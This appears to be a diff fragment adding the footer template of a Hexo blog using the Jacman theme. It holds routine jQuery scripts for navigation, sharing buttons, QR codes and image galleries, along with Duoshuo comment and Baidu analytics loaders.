+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2015 
+		
+		<a href="/about" target="_blank" title="PC_Chen">PC_Chen</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"azyet"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?43a04b04995277b88dba7208cda9e829";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回頂部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
